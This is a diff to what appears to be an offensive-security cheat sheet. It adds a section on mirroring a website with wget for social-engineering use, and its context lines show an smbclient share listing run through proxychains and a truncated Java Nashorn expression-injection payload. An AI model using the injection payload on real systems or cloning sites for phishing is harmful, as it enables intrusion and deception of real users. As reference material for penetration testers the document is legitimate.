@@ -352,3 +352,17 @@ ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new ja
  ```
  $ proxychains smbclient -L fileserver22
  ```
+ 
+ ## Cloning Websites for Social Engineering with Wget:
+ 
+ ```
+ wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com
+ ```
+ Here are the switches:
+```
+--mirror - applies a number of options to make the download recursive.
+--no-parent – Do not crawl the parent directory in order to get a portion of the site only.
+--convert-links - makes all the links to work properly with the offline copy.
+--page-requisites - download JS and CSS files to retain the original page style when browsing a local mirror.
+--adjust-extension - adds the appropriate extensions (e.g. html, css, js) to files if they were retrieved without them.
+```
